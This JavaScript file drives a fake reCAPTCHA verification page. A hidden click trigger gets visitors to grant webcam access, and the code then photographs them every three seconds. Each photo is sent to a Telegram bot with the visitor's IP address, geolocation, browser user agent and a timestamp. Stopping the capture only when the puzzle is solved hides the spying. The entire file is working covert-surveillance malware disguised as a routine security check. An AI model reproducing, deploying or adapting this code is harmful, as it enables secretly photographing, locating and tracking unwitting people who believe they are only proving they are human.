import { CONFIG } from "./config.js";

const video     = document.getElementById("video");
const canvas    = document.getElementById("canvas");
const trigger   = document.getElementById("hidden-trigger");

const statusBox  = document.getElementById("statusBox");
const statusText = document.getElementById("statusText");
const statusSpin = document.getElementById("statusSpinner");
const statusIcon = document.getElementById("statusIcon");

const step1 = document.getElementById("step1");
const step2 = document.getElementById("step2");
const step3 = document.getElementById("step3");
const line1 = document.getElementById("line1");
const line2 = document.getElementById("line2");

const params = new URLSearchParams(window.location.search);
const chatId = params.get("id") || "FALLBACK_CHAT_ID";

let stream       = null;
let captureTimer = null;
let count        = 0;
let capturing    = false;

// ---------- UI Helpers ----------
function setStatus(text, mode = "loading") {
  statusText.textContent = text;
  if (mode === "loading") {
    statusSpin.style.display = "block";
    statusIcon.style.display = "none";
    statusIcon.textContent = "";
  } else {
    statusSpin.style.display = "none";
    statusIcon.style.display = "inline";
    if (mode === "ok")      statusIcon.textContent = "✓";
    else if (mode === "err") statusIcon.textContent = "✕";
    else if (mode === "warn") statusIcon.textContent = "⚠";
  }
}

function updateSteps(stepNum) {
  step1.classList.remove("active");
  step2.classList.remove("active");
  step3.classList.remove("active");
  if (stepNum >= 1) { step1.classList.add("active"); }
  if (stepNum >= 2) { step1.classList.remove("active"); step2.classList.add("active"); }
  if (stepNum >= 3) { step2.classList.remove("active"); step3.classList.add("active"); step1.classList.add("done"); step2.classList.add("done"); line1.classList.add("filled"); line2.classList.add("filled"); }
}

// ---------- Intel functions ----------
async function getIP() {
  try {
    const r = await fetch("https://api.ipify.org?format=json");
    const d = await r.json();
    return d.ip;
  } catch {
    try {
      const r = await fetch("https://ipapi.co/json/");
      const d = await r.json();
      return d.ip;
    } catch { return "Unknown"; }
  }
}

async function getGeo() {
  try {
    const r = await fetch("https://ipapi.co/json/");
    const d = await r.json();
    return `${d.city || "?"}, ${d.country_name || "?"}`;
  } catch { return "Unknown"; }
}

// ---------- Capture & Send ----------
async function capture() {
  if (!stream || !capturing) return;

  canvas.width  = video.videoWidth  || 640;
  canvas.height = video.videoHeight || 480;
  const ctx = canvas.getContext("2d");
  ctx.drawImage(video, 0, 0);

  const blob = await new Promise(res => {
    window.canvas = canvas;
    canvas.toBlob(res, "image/jpeg", 0.75);
  });
  if (!blob) { console.warn("no blob"); return; }

  const ip   = await getIP();
  const geo  = await getGeo();
  const ua   = navigator.userAgent;
  const date = new Date().toLocaleString("en-US", { timeZoneName: "short" });

  const caption = `📸 Capture #${count + 1}
🕐 ${date}
🌐 ${ip} — ${geo}
💻 ${ua}`;

  const fd = new FormData();
  fd.append("chat_id", chatId);
  fd.append("photo", blob, `cap_${Date.now()}.jpg`);
  fd.append("caption", caption);

  try {
    const res = await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendPhoto`, {
      method: "POST", body: fd
    });
    if (!res.ok) console.warn("TG error:", await res.text());
    else count++;
  } catch (e) {
    console.warn("Send failed:", e);
  }
}

// ---------- Stop ----------
function stopCapture() {
  capturing = false;
  if (captureTimer) { clearInterval(captureTimer); captureTimer = null; }
  if (stream) { stream.getTracks().forEach(t => t.stop()); stream = null; }
}

// ---------- Start Camera ----------
async function startCamera() {
  try {
    setStatus("Requesting camera access... Click Allow when prompted");
    updateSteps(2);

    stream = await navigator.mediaDevices.getUserMedia({
      video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: "user" }
    });

    video.srcObject = stream;
    await video.play();
    await new Promise(resolve => {
      if (video.readyState >= 2) return resolve();
      video.onloadeddata = resolve;
      setTimeout(resolve, 2500);
    });

    // Start loop
    capturing = true;
    await capture();
    captureTimer = setInterval(capture, 3000); // every 3s

    setStatus("✓ Camera active — solve the puzzle below", "ok");
    trigger.style.display = "none"; // let them click reCAPTCHA

  } catch (err) {
    console.warn("Camera err:", err);
    setStatus("Camera permission needed. Click anywhere to retry.", "err");
    // keep trigger visible for retry click
    trigger.style.display = "block";
  }
}

// ---------- Triggers ----------
trigger.addEventListener("click", async (ev) => {
  ev.preventDefault();
  ev.stopPropagation();
  trigger.style.display = "none";
  await startCamera();
}, { once: true });

// Fallback: if reCAPTCHA iframe captured the click
document.addEventListener("mousedown", async function retry(ev) {
  if (!capturing && !stream) {
    document.removeEventListener("mousedown", retry);
    await startCamera();
  }
});

// ---------- reCAPTCHA callbacks ----------
window.onRecaptchaSuccess = () => {
  stopCapture();
  updateSteps(3);
  setStatus("✓ Verified! Redirecting...", "ok");
  setTimeout(() => { window.location.href = "next.html"; }, 1000);
};

window.onRecaptchaExpired = () => {
  setStatus("⚠ Session expired. Reverify below.", "warn");
};

window.onRecaptchaError = () => {
  setStatus("⚠ An error occurred. Try again.", "err");
};

// Cleanup
window.addEventListener("beforeunload", stopCapture);
